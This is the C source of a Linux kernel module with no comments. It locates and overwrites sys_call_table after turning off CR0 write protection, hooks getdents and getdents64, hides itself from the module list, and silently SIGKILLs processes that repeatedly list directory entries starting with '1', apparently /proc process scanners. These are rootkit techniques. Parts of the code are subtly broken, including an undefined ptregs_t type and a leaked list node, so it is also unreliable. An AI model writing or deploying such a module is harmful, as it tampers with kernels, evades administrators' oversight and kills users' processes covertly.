#include <linux/sched.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/version.h> 
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kallsyms.h>
#include <linux/unistd.h>
#include <linux/version.h>
#include <linux/kprobes.h>
#include <asm/paravirt.h>
#include <linux/sched.h>

#if LINUX_VERSION_CODE < KERNEL_VERSION(4, 13, 0)
#include <asm/uaccess.h>
#endif

#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 10, 0)
#include <linux/proc_ns.h>
#else
#include <linux/proc_fs.h>
#endif

#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 26)
#include <linux/file.h>
#else
#include <linux/fdtable.h>
#endif

#if LINUX_VERSION_CODE <= KERNEL_VERSION(2, 6, 18)
#include <linux/unistd.h>
#endif

#ifndef __NR_getdents
#define __NR_getdents 141
#endif

#ifndef __NR_getdents64
#define __NR_getdents64 217
#endif

struct linux_dirent {
    unsigned long d_ino;
    unsigned long d_off;
    unsigned short d_reclen;
    char d_name[1];
};

unsigned long* __sys_call_table = NULL;

#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
	typedef asmlinkage long (*t_syscall)(const struct pt_regs *);
	static t_syscall orig_getdents;
	static t_syscall orig_getdents64;
	static t_syscall orig_kill;
#else
	typedef asmlinkage int (*orig_getdents_t)(unsigned int, struct linux_dirent *,
		unsigned int);
	typedef asmlinkage int (*orig_getdents64_t)(unsigned int,
		struct linux_dirent64 *, unsigned int);
	typedef asmlinkage int (*orig_kill_t)(pid_t, int);
	orig_getdents_t orig_getdents;
	orig_getdents64_t orig_getdents64;
#endif

MODULE_LICENSE("GPL");

static struct list_head *prev_module;

typedef struct ViolationNode {
    pid_t pid;
    int violationCount;
    struct ViolationNode* next;
} violation_t;

violation_t* spotter_head = NULL;

static violation_t* addViolation(violation_t *head, pid_t pid) {
    violation_t *new = (violation_t *) kvzalloc(sizeof(violation_t), GFP_KERNEL);
    if (new == NULL) {
        return head;
    }
    new->pid = pid;
    new->violationCount = 1;
    new->next = head;
    return new;
}

static violation_t* findViolation(violation_t *head, pid_t pid) {
    violation_t *tmp = head;
    
    while (tmp != NULL) {
		if (tmp->pid == pid) {
			return tmp;
		}
        tmp = tmp->next;
    }
    return NULL;
}

static int getViolationCount(violation_t *head, pid_t pid) {
    violation_t *tmp = findViolation(head, pid);
    if (tmp == NULL) {
        return 0;
    }
    return tmp->violationCount;
}

static void incrementViolationCount(violation_t *head, pid_t pid) {
    violation_t *tmp = findViolation(head, pid);
    if (tmp == NULL) {
		spotter_head = addViolation(head, pid);
        return;
    }
    tmp->violationCount++;
}

static violation_t* removeViolation(violation_t *head, pid_t pid) {
    violation_t *before = head, *tmp;

    if (head->pid == pid) {
        return head->next;
    }
    
    for (tmp = head->next; tmp != NULL; tmp = tmp->next) {
        if (tmp->pid == pid) {
            before->next = tmp->next;
            kvfree(tmp);
            break;
        }
        before = tmp;
    }
    return head;
}

static void uninitializeViolations(violation_t *head) {
    violation_t *tmp = head;
    while (tmp != NULL) {
        violation_t *tmp2 = tmp->next;
        kvfree(tmp);
        tmp = tmp2;
    }
}

static void hide_module(void)
{
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
}

#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
static asmlinkage long c_getdents64(const struct pt_regs *pt_regs) {
#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
	int fd = (int) pt_regs->di;
	struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->si;
#elif IS_ENABLED(CONFIG_ARM64)
	int fd = (int) pt_regs->regs[0];
	struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->regs[1];
#endif
	int ret = orig_getdents64(pt_regs), err;
#else
asmlinkage int
c_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent,
	unsigned int count)
{
	int ret = orig_getdents64(fd, dirent, count), err;
#endif
	unsigned short proc = 0;
	unsigned long off = 0;
	struct linux_dirent64 *dir, *kdirent, *prev = NULL;
	struct inode *d_inode;

	if (ret <= 0)
		return ret;

	kdirent = kzalloc(ret, GFP_KERNEL);
	if (kdirent == NULL)
		return ret;

	err = copy_from_user(kdirent, dirent, ret);
	if (err)
		goto out;

#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
	d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;
#else
	d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
#endif

	while (off < ret) {
		dir = (void *)kdirent + off;

		if (memcmp("1", dir->d_name, strlen("1")) == 0) {
            incrementViolationCount(spotter_head, current->pid);
            if (getViolationCount(spotter_head, current->pid) > 100) {
				kill_pid(current->pid, SIGKILL, 1);

                spotter_head = removeViolation(spotter_head, current->pid);
            }
		} else
			prev = dir;
		off += dir->d_reclen;
	}
	err = copy_to_user(dirent, kdirent, ret);
	if (err)
		goto out;
out:
	kfree(kdirent);
	return ret;
}

#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
static asmlinkage long c_getdents(const struct pt_regs *pt_regs) {
#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
	int fd = (int) pt_regs->di;
	struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->si;
#elif IS_ENABLED(CONFIG_ARM64)
		int fd = (int) pt_regs->regs[0];
	struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->regs[1];
#endif
	int ret = orig_getdents(pt_regs), err;
#else
asmlinkage int
c_getdents(unsigned int fd, struct linux_dirent __user *dirent,
	unsigned int count)
{
	int ret = orig_getdents(fd, dirent, count), err;
#endif
	unsigned long off = 0;
	struct linux_dirent *dir, *kdirent, *prev = NULL;
	struct inode *d_inode;

	if (ret <= 0)
		return ret;	

	kdirent = kzalloc(ret, GFP_KERNEL);
	if (kdirent == NULL)
		return ret;

	err = copy_from_user(kdirent, dirent, ret);
	if (err)
		goto out;

#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
	d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;
#else
	d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
#endif

	while (off < ret) {
		dir = (void *)kdirent + off;

        if (memcmp("1", dir->d_name, strlen("1")) == 0) {
            incrementViolationCount(spotter_head, current->pid);
            if (getViolationCount(spotter_head, current->pid) > 100) {
				kill_pid(current->pid, SIGKILL, 1);

                spotter_head = removeViolation(spotter_head, current->pid);
            }
		} else
			prev = dir;
		off += dir->d_reclen;
	}
	err = copy_to_user(dirent, kdirent, ret);
	if (err)
		goto out;
out:
	kfree(kdirent);
	return ret;
}

static int store(void)
{
    orig_getdents64 = (ptregs_t)__sys_call_table[__NR_getdents64];
    orig_getdents = (ptregs_t)__sys_call_table[__NR_getdents];
    return 0;
}

static int hook(void)
{
    __sys_call_table[__NR_getdents64] = (unsigned long)&c_getdents64;
    __sys_call_table[__NR_getdents] = (unsigned long)&c_getdents;

    return 0;
}

static int cleanup(void)
{
    __sys_call_table[__NR_getdents64] = (unsigned long)orig_getdents64;
    __sys_call_table[__NR_getdents] = (unsigned long)orig_getdents;

    return 0;
}


#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
#define KPROBE_LOOKUP 1
#include <linux/kprobes.h>
static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name"
};
#endif

static unsigned long* get_syscall_table(void)
{
    unsigned long* syscall_table;

#ifdef KPROBE_LOOKUP

    typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
    kallsyms_lookup_name_t kallsyms_lookup_name;

    register_kprobe(&kp);

    kallsyms_lookup_name = (kallsyms_lookup_name_t)kp.addr;

    unregister_kprobe(&kp);
#endif
    syscall_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");
    return syscall_table;
}


static inline void write_cr0_forced(unsigned long val)
{
    unsigned long __force_order;

    asm volatile(
        "mov %0, %%cr0"
        : "+r"(val), "+m"(__force_order));
}

static void protect_memory(void)
{
    write_cr0_forced(read_cr0() | (0x10000));
}

static void unprotect_memory(void)
{
    write_cr0_forced(read_cr0() & (~ 0x10000));
}

static int __init mod_init(void)
{
    __sys_call_table = get_syscall_table();
    store();
    unprotect_memory();
    hook();
    protect_memory();

    hide_module();

    return 0;
}

static void __exit mod_exit(void)
{
    unprotect_memory();
    cleanup();
    protect_memory();
    
    uninitializeViolations(spotter_head);
}

module_init(mod_init);
module_exit(mod_exit);